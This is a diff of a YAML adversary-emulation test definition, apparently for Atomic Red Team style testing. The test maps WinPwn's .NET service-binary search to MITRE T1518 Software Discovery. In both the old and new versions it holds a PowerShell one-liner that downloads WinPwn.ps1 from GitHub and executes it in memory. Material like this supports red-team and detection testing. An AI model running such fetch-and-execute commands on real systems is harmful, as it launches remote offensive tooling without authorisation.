@@ -1,13 +1,15 @@
-- id: 1007e338-4a3e-595a-be5e-d649dc27d9a7
+- requirements: []
   name: Soumaia ART Tests - WinPwn - DotNet
   description: Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.
   tactic: discovery
-  technique:
-    attack_id: T1518
-    name: Software Discovery
-  platforms:
-    windows:
-      psh:
-        command: |-
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-          dotnet -consoleoutput -noninteractive
+  technique_id: T1518
+  technique_name: Software Discovery
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive
+  id: 1007e338-4a3e-595a-be5e-d649dc27d9a7
